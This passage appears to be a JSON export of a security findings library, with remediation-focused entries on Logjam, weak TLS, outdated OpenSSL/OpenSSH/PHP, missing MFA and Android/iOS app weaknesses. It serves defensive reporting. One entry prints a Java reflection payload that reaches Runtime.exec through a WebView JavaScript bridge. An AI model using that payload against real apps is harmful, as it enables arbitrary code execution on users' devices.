parameters with a 512-bit modulus.\n--The attacker now obtains the server's public DH key and computes its discrete log. Subsequently, the attacker closes the connection with the server.\n--The client ends up successfully completing the DH key exchange and requests a confirmation from the server.\n--Once the attacker computes the discrete logarithm, he derives the connection key and sends a forged confirmation to the client.\n--The client is tricked into accepting this confirmation.\n--Now the attacker is able to successfully impersonate the server to the client and can read all information that flows over the connection.\n\nThe Logjam vulnerability affects TLS and other protocols that use traditional (i.e. non-Elliptic Curve) Diffie-Hellman key exchange. In particular, any server that supports DHE_EXPORT ciphers is vulnerable.\n","poc":null,"impact":"Unlike keys 1024 bits or greater, 512-bit DH keys are short enough to crack in a reasonable amount of time. Once an attacker cracks the 512-bit key, they can eavesdrop on the connection to read and modify any sensitive data (such as user passwords, session identifiers, etc.) passed between the client and server.\n","remediation":"Support for all DHE_EXPORT cipher suites should be disabled on the server. Server administrators should also make sure to use either 2048-bit DHE with a freshly generated group or deploy ECDHE (Elliptic Curve Diffie-Hellman Exchange), thereby generating a strong unique Diffie-Hellman group.\nOn the client, browsers should be kept up-to-date which will help mitigate the attack by enforcing a Diffie-Hellman key size of at least 2048 bits. The simplest way of generating a 2048-bit Diffie-Hellman group is via OpenSSL:\n<pre>openssl dhparam -out dhparams.pem 2048 </pre>\nFor Apache, SSL parameters are set in the httpd.conf configuration file. As far as cipher suites are concerned, disable support for SSLv2 and SSLv3 and enable support for TLS. The following ciphers should be explicitly allowed / disallowed in that order:\n<pre>SSLProtocol             all -SSLv2 -SSLv3  SSLCipherSuite          ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA  SSLHonorCipherOrder     on </pre>\nIn newer versions of Apache (version 2.4.8 or greater) and OpenSSL 1.0.2 or later, DH parameters can be directly specified as follows: <pre>SSLOpenSSLConfCmd DHParameters \"{path to dhparams.pem}\" </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":635,"plugin_id":null,"title":"Lack of Multi-Factor Authentication","type":null,"description":"The application uses single-factor authentication to authenticate privileged users to the system. Single-factor authentication refers to the use of a single component to identify an end user to an application or system. The factor provided may be something the user knows, something the user is, or something the user has. Each of these options provides their own set of advantages and risks when used for authentication:\n--\"Something you know\", such as a user-defined password, may be easily created and changed when necessary. Authentication factors derived from the end user must to some degree be managed by the user themselves, leaving the known secret's security up to them. This can result in the secret being forgotten or exposed through a breach of a separate system that holds or uses the same known secret.\n--\"Something you are\", such as a fingerprint, provides an end user with a constant factor that cannot be easily acquired or mimicked by an attacker. While this initially provides a strong barrier to entry and will always be with the end user, a single breach could leave the attribute used for authentication useless as it cannot be updated.\n--\"Something you have\", such as a hardware token, can be managed from a central source and is configured to constantly update, removing responsibility for the known secret from the user. However, this transition of the knowledge base may hinder the application's accessibility if the device is not always at hand.\n\n","poc":null,"impact":"The use of single factor authentication may result in an attacker gaining escalated privileges or unauthorized access to sensitive data. Once an attacker compromises the authentication mechanism (e.g. a victim's account password), they will have full access to functionality and data normally only available to the victim.\n","remediation":"Multi-factor authentication should be implemented and enforced for externally-accessible applications containing sensitive data or functionality. Multi-factor authentication is built upon the combination of two or more components that can prove a user's identity to the application. This provides an additional layer of security as it is assumed that an unauthorized attacker won't be able to supply both factors required for authentication. The factors required by the application should be a combination of at least two distinct factors from the following:\n--Something the user knows\n--Something the user is\n--Something the user has\n\nNote: requiring two or more pieces of information for authentication that fall under the same factor category does not provide true multi-factor authentication. For example, a user's password and the answer to their security question are both something the user knows. Requiring both during authentication does not represent true multi-factor authentication.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":636,"plugin_id":null,"title":"OpenSSL Vulnerable Version in Use","type":null,"description":"The remote server is running a version of OpenSSL which contains known vulnerabilities. OpenSSL is an open-source software library that provides general-purpose cryptography as well as implementations of the Transport Layer Security (TLS) and Secure Sockets Layer (SSL) protocols, which are used to secure communications over computer networks.\n","poc":null,"impact":"In general, published vulnerabilities have a greater likelihood of exploitation by attackers due to readily available proof-of-concept code that exploits the issue, or integrates the exploits into freely available testing tools. The vulnerabilities present in OpenSSL (and subsequently the impact of exploit) depend on the version currently deployed. Certain versions of OpenSSL are vulnerable to denial of service attacks that prevent legitimate users from accessing resources hosted on the affected server. Vulnerabilities present in various cryptographic functions in specific versions of OpenSSL may allow an attacker to decrypt encrypted network traffic, exposing victims' sensitive information and potentially allowing the attacker to modify data or impersonate the victim in applications hosted on the affected server.\nFor the latest list of CVE's open against OpenSSL, select the deployed version of OpenSSL from the version list on the following page:\nhttp://www.cvedetails.com/version-list/217/383/1/Openssl-Openssl.html\n","remediation":"Upgrade to the latest version of OpenSSL. Organizations should also use a patch management system to keep software up to date without disrupting ongoing business. There are a number of commercial patch management systems such as Microsoft Windows Server Update Services (WSUS), Kaseya Patch Management, and Patch Manager from Solarwinds, that organizations may choose to employ for this purpose.\n","cvss_base_score":4.3,"cvss_temporal_score":3.7,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:N/E:U/RL:ND/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":637,"plugin_id":null,"title":"OpenSSH Vulnerable Version in Use","type":null,"description":"The remote server is running a version of OpenSSH which contains known vulnerabilities. OpenSSH is an open-source software library based on the SSH protocol that provides remote login, secure FTP, and other network services that allow users to communicate securely over computer networks.\n","poc":null,"impact":"In general, published vulnerabilities have a greater likelihood of exploitation by attackers due to readily available proof-of-concept code that exploits the issue, or integrates the exploits into freely available testing tools. The vulnerabilities present in OpenSSH (and subsequently the impact of exploit) depend on the version currently deployed. Certain versions of OpenSSH are vulnerable to denial of service attacks that prevent legitimate users from accessing resources hosted on the affected server. Other vulnerabilities present in specific versions of OpenSSH may allow an attacker to elevate their user privileges on the server, gain unauthorized access to sensitive information, or impersonate other users on the affected server.\nFor the latest list of CVE's open against OpenSSH, select the deployed version of OpenSSH from the version list on the following page:\nhttp://www.cvedetails.com/version-list/97/585/1/Openbsd-Openssh.html\n","remediation":"Upgrade to the latest version of OpenSSH. Organizations should also use a patch management system to keep software up to date without disrupting ongoing business. There are a number of commercial patch management systems such as Microsoft Windows Server Update Services (WSUS), Kaseya Patch Management, and Patch Manager from Solarwinds, that organizations may choose to employ for this purpose.\n","cvss_base_score":4.3,"cvss_temporal_score":3.7,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:N/E:U/RL:ND/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":638,"plugin_id":null,"title":"PHP Vulnerable Version in Use","type":null,"description":"The remote server is running a version of PHP which contains known vulnerabilities. PHP is a server-side scripting language most commonly processed by a web server module to serve dynamically-generated web content to clients.\n","poc":null,"impact":"In general, published vulnerabilities have a greater likelihood of exploitation by attackers due to readily available proof-of-concept code that exploits the issue, or integrates the exploits into freely available testing tools. The vulnerabilities present in PHP (and subsequently the impact of exploit) depend on the version currently deployed, however, exploiting certain published vulnerabilities may lead to denial of service conditions, arbitrary code execution, and buffer overflows, among others.\nFor the latest list of CVE's open against PHP, select the deployed version of PHP from the version list on the following page:\nhttp://www.cvedetails.com/version-list/74/128/1/PHP-PHP.html\n","remediation":"Upgrade to the latest version of PHP. Organizations should also use a patch management system to keep software up to date without disrupting ongoing business. There are a number of commercial patch management systems such as Microsoft Windows Server Update Services (WSUS), Kaseya Patch Management, and Patch Manager from Solarwinds, that organizations may choose to employ for this purpose.\n","cvss_base_score":4.3,"cvss_temporal_score":3.7,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:N/E:U/RL:ND/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:15","updated_at":"2018-11-12 09:25:15","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":639,"plugin_id":null,"title":"TLSv1.0 Supported","type":null,"description":"The server-side SSL/TLS endpoint is configured to allow connections using TLS protocol version 1.0 (\"TLSv1.0\"), which contains known weaknesses. The TLS protocol provides secure transport between endpoints over a network, with the intended effect of offering data integrity and confidentiality. Certain configurations of TLS version 1.0 are vulnerable to known man-in-the-middle (\"MitM\") attacks, including the BEAST and POODLE attacks. In addition, multiple standards organizations including NIST and PCI have declared that TLSv1.0 no longer provides sufficient data protection.\nWeaknesses in TLSv1.0 connections may allow an attacker to decrypt traffic passed between a victim's client and the server. Any sensitive information passed over this connection may be exposed, such as credentials, account data, personally identifiable information (PII), financial records, etc. Exposure of session identifiers may allow an attacker to hijack a victim's session and impersonate the victim in the application. An attacker who decrypts traffic in transit between a victim's client and the server may also modify data in transit, allowing them to modify requests the victim has initiated and any data being returned to the client.","poc":"","impact":"","remediation":"The server-side TLS endpoint's configuration should be updated to allow only TLSv1.2 connections with cipher suites that use:\n--Ephemeral Diffie-Hellman for key exchange (optionally, allow RSA for key exchange if necessary for supporting some clients)\n--Block ciphers with key lengths of at least 128 bits (AES-128 and AES-256; optionally allow 3DES with 112-bit keys if necessary for supporting some clients)\n--Block ciphers in GCM mode (optionally, allow block ciphers in CBC mode if necessary for supporting some clients)\n--The SHA2 family of hash functions (SHA256, SHA384, SHA512) for block ciphers in CBC mode if necessary; optionally, allow SHA1 if necessary for supporting some clients\n\nFor further information on NIST policies surrounding TLS deprecation, please refer to the following link:\nhttp://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-52r1.pdf","cvss_base_score":4,"cvss_temporal_score":3,"cvss_vector":"(AV:N/AC:H/Au:N/C:N/I:P/A:P/E:U/RL:OF/RC:C/CDP:ND/TD:ND/CR:H/IR:H/AR:H)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2019-01-16 06:11:26","approved":1,"v_likelihood":"Minimal","v_impact":"High","steps_to_reproduce":"1.\tUsing a tool like SSLScan, run the following commands:\n<pre>sslscan INSTANCE URL<pre>\n2.\tObserve the system supports TLSv1.0.","likelihood_text":""},{"id":640,"plugin_id":null,"title":"Application Accepts Self-Signed Certificates","type":null,"description":"The application contains code that accepts one or more self-signed certificates. Although using certificates signed by widely trusted certificate authorities is not strictly required for most mobile apps (because end users never see the certificates, and because the certificate chains do not need to be verified by generic client software), it is still a best practice. Using self-signed certificates in mobile apps introduces some risk because:\n--There are no controls in place to ensure that strong signing and hashing algorithms are being used.\n--There are no controls in place to ensure that the certificates are not valid for excessively long periods of time and that other certificate rotation policies are in place.\n--There are no controls in place to ensure that only authorized users within an organization can get certificates for servers in its domain.\n--There are no auditing controls in place to verify who obtained a certificate for a particular server and when.\n--Default certificate verification code provided by the mobile platform is often overridden to allow use of self-signed certificates, which can introduce vulnerabilities.\n\n","poc":null,"impact":"Using self-signed certificates makes it difficult to enforce policies around certificates. This may result in poor key management, separation of duties, audit trails, etc. For example:\n--Developers may create self-signed certificates with private keys that are not well-protected. They may have copies of the private keys on their workstations, in version control systems, etc. Many insiders may be able to access these keys that are valid in the production environment.\n--It is difficult to rotate keys/certificates regularly and securely. Without a chain of trust provided by a certificate authority, the application must trust the self-signed certificate directly. Changing the self-signed certificate requires non-trivial coordination between the development and operations teams. For example, the operations team may need to ask the development team to start trusting a new certificate/key (so that the latest versions of the application trust two certificates), and then wait until almost all users have upgraded their application before switching to the new certificate/key. Finally, the development team would need to release a new version of the application that does not trust the old certificate/key. All of this complexity is avoided by simply using a certificate that is signed by a widely trusted certificate authority so that the operations team can revoke/update certificates/keys as needed without any involvement from the development team.\n\n","remediation":"Consider using a certificate issued by a widely trusted certificate authority and removing the app code that handles self-signed certificates.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":641,"plugin_id":null,"title":"Application Allows Backups (Android)","type":null,"description":"The application is configured to allow its data to be backed up and restored to other devices. Android application data can be backed up in several ways; for example:\n--Using the Android Debug Bridge (ADB) if it is enabled on a device. The user (or an application on the user's computer) can initiate a backup using the 'adb backup' command.\n--Using a third party backup application running on a device.\n--Using the auto-backup functionality introduced in Android 6.0 (http://developer.android.com/training/backup/autosyncapi.html)\n\n","poc":null,"impact":"An attacker can potentially view or modify the application's locally stored data without having 'root' access to the device.\nThe application's stored data can be backed up to a local PC, to a SD card, or to a cloud service, and can be restored to another device. An attacker could initiate a backup on a user's device, or could get access to a user's existing backup in several ways; for example:\n--If an attacker has physical access to an unrooted and unlocked device, they may be able to use adb or a backup application to get access to the contents of the application's data directory.\n--A malicious application running without root privileges might be able to use the BackupManager interface to get access to the contents of the application's data directory.\n--If an attacker has physical access to a device with an unencrypted SD Card containing a backup of the application's data directory, the attacker could simply remove the SD Card to read the application's data from another device.\n--Existing backups created by the user stored in various locations such as the user's PC or a cloud service could be compromised by exploiting vulnerabilities in those systems.\n\nAdditionally, a user can back up the application's data, modify it and then restore it to bypass security controls that depend on the application's locally stored data. The user could also restore the data to a different device. This could be problematic for applications that attempt to tie registration/enrollment to devices and do not want users to be able to switch devices without going through a new registration/enrollment process.\nNote that if a device is 'rooted', this issue becomes less relevant because any software running with 'root' privileges (where file system access is not restricted using SEAndroid policies) will be able to read the application's data directory contents directly.\n","remediation":"To disable application backups, set the \"android:allowBackup\" attribute of the <application> element to \"false\" in the application's AndroidManifest.xml file. If the attribute is omitted, Android allows backups by default. See http://developer.android.com/guide/topics/manifest/application-element.html for details.\nNote that this attribute has little impact if the application is running on a 'rooted' device. An application running with root privileges (on a device without SEAndroid, on a device with SEAndroid not set to Enforcing, or on a device with a SEAndroid policy that does not restrict the application's filesystem access) will always be able to access (and backup) data for all other applications on the device regardless of the value of the \"android:allowBackup\" attribute.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"Low","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":642,"plugin_id":null,"title":"Application Contains Insecure Cookie Policy (iOS)","type":null,"description":"The application's cookie policy is set to 'NSHTTPCookieAcceptPolicyAlways', allowing cookies to be processed from any domain, even those outside the organization. Without additional URL or domain white-listing, cookies from any third-party domain will be accepted and used.\nThe standard Apple APIs define three (3) cookie policies, listed from least restrictive to most restrictive:\n--Accept Always (NSHTTPCookieAcceptPolicyAlways)\n--Accept Only from Main Document Domain (NSHTTPCookieAcceptPolicyOnlyFromMainDocumentDomain)\n--Accept Never (NSHTTPCookieAcceptPolicyNever)\n\n","poc":null,"impact":"Setting an overly broad cookie policy allows the application to accept third-party cookies in the context of the application sandbox. This potentially violates the organization's published privacy policy, since cookies can be used to track/monitor a victim's online presence. If the application requests third party content using a connection with a cookie policy set to \"Accept Always\", the main document URL may be passed in Referer headers to third parties along with the third party cookies. This may allow third parties to see when application users are using the application, what page(s) they are visiting in the application, etc. If this is expected application behavior, users should be made aware of this, as a condition of application use.\n","remediation":"The application should set the cookie policy to the most restrictive policy that is needed.\n--If no cookies are required (rare), set the policy to never accept (NSHTTPCookieAcceptPolicyNever)\n--If cookies from the main document domain are required (common), set the cookie policy to accept only from main document domain (NSHTTPCookieAcceptPolicyOnlyFromMainDocumentDomain)\n--If cookies from the main document domain AND a specific third-party domain are required (common when using a web tracker), set the cookie policy to always (NSHTTPCookieAcceptPolicyAlways) and register for cookie change notifications (NSHTTPCookieManagerCookiesChangedNotification) to remove any non-approved domain cookies.\n\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"Low","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":643,"plugin_id":null,"title":"Application Uses addJavaScriptInterface Method (Android)","type":null,"description":"The application uses the WebView.addJavascriptInterface(Object object, String name) method, which may allow an attacker to execute arbitrary Java code on the device. The addJavascriptInterface method inserts a named object (or \"bridge\") reference to the supplied Java \"object\" into a WebView. JavaScript code run in this WebView can then access the object by the \"name\" parameter value and execute its methods.\nAll public methods in the injected Java object including public methods from parent classes are accessible from JavaScript in applications that target Android API level 16 or lower (regardless of which version of Android they are actually running on). The same issue is present in applications that are running on Android versions older than 4.2 (regardless of their target API level). If an application targets API level 17 or higher AND the application is running on a device with Android 4.2 or newer, then only methods that are annotated with @JavascriptInterface are accessible from JavaScript.\n","poc":null,"impact":"An attacker that can inject JavaScript code into the application's WebView on vulnerable applications/devices (e.g. by exploiting a cross-site scripting vulnerability or by modifying HTML/JavaScript/CSS files being transmitted over insecure channels) may be able to execute arbitrary Java code using the JavaScript bridge. In a vulnerable application that exposes a Java object as \"name\" in JavaScript, an attacker that can inject JavaScript code into the application can inject a command such as:\n<pre><code class=\"java\">name.getClass().forName('java.lang.Runtime')   .getMethod('getRuntime',null)   .invoke(null,null)   .exec('command'); </pre>\nSince all Java classes inherit from java.lang.Object, they all contain the public getClass() method that returns a java.lang.Class object. This in turn allows Reflection APIs to be used to instantiate arbitrary objects and execute methods in them.\nThe attacker's injected code will also have access to native device APIs and can perform any actions that the application's Java code can perform (e.g. access functionality like camera and Bluetooth, data stored by the application on the device, as well as other data like a user's contacts). Note that third party JavaScript code loaded in the WebView (e.g. advertising, diagnostic, or GUI libraries) may introduce attack vectors such as cross-site scripting and information leakage via transmission over insecure channels.\nAdditionally, in some Android versions (4.0.0 - 4.1.2), the core WebView code automatically creates at least one JavaScript Interface called searchBoxJavaBridge_ in every WebView; this may make an application vulnerable even if it does not explicitly use addJavascriptInterface.\n","remediation":"If JavaScript bridges are not needed by the application, then simply remove them. JavaScript bridges that are added automatically on some versions of Android should also be removed; for example by calling:\n<pre><code class=\"java\">WebView.removeJavascriptInterface(\"searchBoxJavaBridge_\") </pre>\nOtherwise, the methods that can be invoked via a JavaScript bridge need to be restricted. This can only be done if the application sets its minSdkVersion and targetSdkVersion to 17 or higher.\nIf the application needs to run on older versions of Android and JavaScript bridges are required, ensure that the application does not contain any attack vectors that can be used to inject malicious JavaScript code into the application (e.g. ensure there are no cross-site scripting vulnerabilities, and all data is transmitted over TLS).\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"Low","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":644,"plugin_id":null,"title":"Client-Side JavaScript Cookie Reference","type":null,"description":"Cookie references were discovered in client-side JavaScript. Cookie references contained in JavaScript are typically used to allow the client-side code to read or modify the value of the cookies. For example, client-side code may reference a cookie value to set a new expiration time once an event is triggered.\n","poc":null,"impact":"Client-side code referencing cookies provides an attacker with information about the structure of the cookies. In addition, the existence of client-side JavaScript which reads or modifies cookie values indicates that such cookies are not marked as HttpOnly. Such cookies are vulnerable to modification or data leakage via malicious code injected into the web page (through attacks such as cross-site scripting).\n","remediation":"All business and security logic associated with application cookies should be performed on the server and never by client-side code. Any instances in which sensitive data is referenced within the client-side code should be removed.\n","cvss_base_score":3.8,"cvss_temporal_score":2.8,"cvss_vector":"(AV:L/AC:H/Au:S/C:N/I:C/A:N/E:U/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"Medium","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":645,"plugin_id":null,"title":"Certificate Validation Disabled","type":null,"description":"The application disables server certificate verification for SSL/TLS connections that it initiates. Without server certificate verification, the application will connect to any server that presents a certificate regardless of whether the certificate was signed by a trusted certificate authority, generated for the host that the app is connecting to, has expired, etc.\n","poc":null,"impact":"The application will not authenticate the server that it is connecting to. Therefore, an attacker can use network-layer attacks to cause the application on a victim's device to connect to his/her server to steal user credentials, supply malicious data to the app, etc.\n","remediation":"Do not bypass the default certificate verification behavior provided by the platform. Adding checks not provided by default (e.g. to perform certificate pinning) is acceptable; however, the default checks should not be bypassed. Any changes to default certificate verification logic must be thoroughly reviewed as part of a security assessment to ensure that it does not cause any unintended side-effects.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":646,"plugin_id":null,"title":"Cipher Initialized with a Hard-coded Key in Mobile Client-side Code","type":null,"description":"The application uses an encryption algorithm with a key hard-coded in the binary. This introduces several problems:\n--The secret is global - it is the same on all devices. An attacker can reverse engineer the binary to obtain the hard-coded key once and use it to decrypt and/or tamper with protected data handled by all devices where the application is installed. Whether/how an attacker might be able to get access to the protected data depends on what exactly the key is used for.\n--Depending on what the key is used for, it may not be possible to change the key easily as it could create backward compatibility issues.\n\n","poc":null,"impact":"The consequence of an attacker gaining access to the key depends on what the key is protecting. For example:\n--If the key is used to protect data stored on devices, an attacker who gets access to the protected data (e.g. through physical access to a device or through malware running on a device) will be able to decrypt and/or tamper with it.\n--If the key is used to protect device-device or device-server communication, an attacker who can access the protected data (e.g. through network-layer attacks) will be able to decrypt and/or tamper with it.\n\n","remediation":"Secure alternatives to storing the encryption key in the application binary vary depending on what the key is being used to encrypt or decrypt. Some common scenarios and associated remediation are discussed below:\nExample Scenario 1: The device needs to encrypt data that needs to be decrypted by a server. In this case, using TLS (optionally, with certificate pinning in the mobile app) should be the primary control. If it is desirable to encrypt data sent inside the TLS connection as well (e.g. to protect against potential TLS vulnerabilities), then generate an asymmetric key pair on the server and hard-code the public key in the app binary. Then when encrypting data to send to the server, generate a random AES key, encrypt data with it, encrypt the AES key using the public key and send the encrypted data and the encrypted AES key to the server. Attackers will be able to reverse engineer the binary and extract the hard-coded public key; however, this key will not allow them to decrypt data.\nExample Scenario 2: The device needs to decrypt data that is encrypted by a server (non-DRM scenarios where only transport protection is needed). As discussed above, TLS should be the primary control. Additionally, if needed, have the app generate an asymmetric key pair when a user first authenticates, and provide the public key to the server. Then, when the server needs to encrypt data to send to a device, it should generate a random AES key, encrypt data with it, encrypt the AES key using the target device's public key, and send the encrypted data and the encrypted AES key to the device.\nExample Scenario 3: The device needs to decrypt data that is encrypted by a server (DRM scenarios where the key also needs to be protected in memory while it is in use). In this case, consider using whitebox cryptography and harden the binary using a commercial tool to prevent code lifting attacks.\nExample Scenario 4: The device needs to encrypt data to store locally and needs the ability to decrypt it later. In this case, generate a key using application and device-specific values (e.g. device IDs) such that the key does not need to be stored anywhere and can be generated when needed. Then, harden the binary using a commercial tool to make it difficult for an attacker to reverse engineer the key generation logic. Alternately, have the user select a PIN or passcode, generate a random salt, and use the two values and an adaptive hash function (e.g. PBKDF2) to generate a key to encrypt the data. The PIN/passcode should not be stored anywhere, and the salt can be stored in the clear in the application's data directory (on Android) or in the keychain (on iOS). One drawback of the latter approach is that if the user forgets his/her PIN/passcode, then the locally stored encrypted data will not be recoverable.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":647,"plugin_id":null,"title":"Debuggable Flag Set to True in Application Manifest","type":null,"description":"The android:debuggable flag in the <application> element is set to \"true\" in the application's AndroidManifest.xml file. Normally, if Android SDK Tools Revision 8 or newer are being used to build the application, this is done automatically for debug builds to allow the application to be debugged. For release builds, this attribute is not included by default. Therefore, either a debug build of the application was provided for testing, or the flag was manually added to the manifest and set to \"true\" for a release build.\nA user with physical access to a device can attach a debugger to the application. Other applications on the device can also debug the application as described below. A debugger that is attached to a process can communicate directly with the application's Java virtual machine and perform actions such as method invocation, stack examination, and class loading.\nIf the debuggable flag is set to \"true\", the application will attempt to connect to a local Unix socket called \"@jdwp-control\" to register itself as a debuggable application. Normally, the Android Debug Bridge Daemon (adbd) starts and opens this socket when USB debugging is enabled on the device and the device is connected to a PC. Once the socket connection succeeds, a port is opened in the debuggable application process that a debugger can connect to using the Java Debug Wire Protocol (JDWP). The adbd process maintains a list of debuggable processes and allows debuggers to connect to them. Other applications on the device can open the \"@jdwp-control\" UNIX socket before adbd does, and then, connect to debuggable applications over the debugging ports that get created.\n","poc":null,"impact":"This will allow an attacker with physical access to a device, as well as other applications running on the device, to gain full control over the debuggable application. This makes a number of attacks possible, including:\n--Bypass security controls such as authentication and authorization checks by invoking arbitrary methods in the application out of order.\n--Read sensitive data in the application's process memory.\n--Inject code into the application's process. Attacker-controlled code can perform arbitrary actions within the context of the target application such as reading/writing files inside the application sandbox, intercepting network communications to/from the application, etc.\n\n","remediation":"When building an application using the Android SDK Tools Revision 8 or newer, there is no need to add the \"debuggable\" attribute to the manifest. Debug builds automatically include the attribute and release builds do not. See http://developer.android.com/tools/sdk/tools-notes.html for details.\nWhen building an application using an older version of the Android SDK Tools, remove the \"debuggable\" attribute from the manifest. Note that if the attribute is missing, the default value of debuggable=false is used.\nWhen building an application using a cross-platform development framework, consult the framework's documentation to determine how to configure the debuggable attribute in the manifest.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:16","updated_at":"2018-11-12 09:25:16","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":648,"plugin_id":null,"title":"Hard-coded Secrets in Client-side Code (Mobile)","type":null,"description":"The application binary or another file in the application package contains a hard-coded secret. Hard-coded secrets present several problems:\n--The secret is the same on all devices. An attacker can extract the file containing the secret or reverse engineer the binary to obtain the hard-coded secret. Once the secret is obtained on one device, it can be used to expose the data it protects on any device where the application is installed.\n--It may not be possible to change the secret easily and it could create backward compatibility issues if it is changed in subsequent application versions.\n\n","poc":null,"impact":"The impact depends on what exactly the secret is used for. For example:\n--If the secret is used to protect data stored on devices, an attacker who gets access to the protected data on another user's device (e.g. through physical access to a device or through malware running on a device) will be able to decrypt and/or tamper with it.\n--If the secret is used to protect device-device or device-server communication, an attacker who can access the protected data (e.g. through network-layer attacks) will be able to decrypt and/or tamper with it.\n\n","remediation":"The remediation depends on the secret's purpose. Some common scenarios and their respective remediation are discussed below.\nScenario 1: The device needs to encrypt data to protect it only during transmission to the server, where it will be decrypted. In this case, using TLS (optionally, with certificate pinning in the 